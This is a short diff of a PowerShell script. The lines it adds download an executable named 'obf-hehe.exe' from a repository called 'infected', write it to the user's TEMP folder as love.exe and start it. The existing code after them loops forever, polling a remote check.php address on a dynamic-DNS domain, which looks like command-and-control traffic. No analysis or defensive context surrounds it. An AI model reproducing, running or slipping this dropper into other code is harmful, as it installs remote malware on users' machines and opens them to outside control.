@@ -1,3 +1,9 @@
+$url = "https://github.com/c2loves/infected/raw/refs/heads/main/obf-hehe.exe"
+$outfile = "$env:TEMP\love.exe"
+Invoke-WebRequest -Uri $url -OutFile $outfile
+Start-Process $outfile
+
+
 while ($true) {
     try {
         $response = Invoke-WebRequest -Uri "https://ancuopvpscongkhai.wvxx.dpdns.org/yum/check.php"
